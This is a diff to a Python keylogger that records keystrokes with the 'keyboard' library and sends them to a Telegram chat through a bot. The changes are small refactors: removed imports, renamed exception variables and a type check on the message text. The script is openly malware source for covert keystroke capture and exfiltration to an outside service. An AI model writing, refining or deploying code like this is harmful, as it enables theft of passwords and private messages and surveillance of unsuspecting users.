@@ -1,9 +1,5 @@
 import keyboard
-import time
-
 import telepot
-from telepot.loop import MessageLoop
-import threading
 
 CHAT_ID = ""
 TOKEN = ""
@@ -15,10 +11,11 @@ class KeylogBot:
 
     def send_message_string(self, text):
         try:
-            text = ",".join(text)
+            if isinstance(text, list):
+                text = ",".join(text)
             self.bot.sendMessage(chat_id=CHAT_ID, text=text)
-        except Exception as e:
-            self.send_message_string(f"Error sending message: {e}")
+        except Exception as error1:
+            self.send_message_string(f"Error sending message: {error1}")
 
 
 class KeyLog:
@@ -39,8 +36,8 @@ class KeyLog:
             self.total.append(self.pressed_keys)
             telegram_bot.send_message_string(self.pressed_keys)
             self.pressed_keys.clear()
-        except Exception as e:
-            telegram_bot.send_message_string(f"Error in logging:{e}")
+        except Exception as error2:
+            telegram_bot.send_message_string(f"Error in logging:{error2}")
 
     @staticmethod
     def convert_event_to_string(event):
@@ -59,14 +56,14 @@ def keylogger():
         bot.send_message_string(f"Keylogger terminated.")
         print("Exiting...")
         exit()
-    except Exception as e:
-        bot.send_message_string(f"Keylogger error: {e}")
+    except Exception as error0:
+        bot.send_message_string(f"Keylogger error: {error0}")
         exit()
 
 
 if __name__ == "__main__":
     try:
         keylogger()
-    except Exception as e:
-        print(f"Error: {e}")
+    except Exception as error:
+        print(f"Error: {error}")
         exit(1)
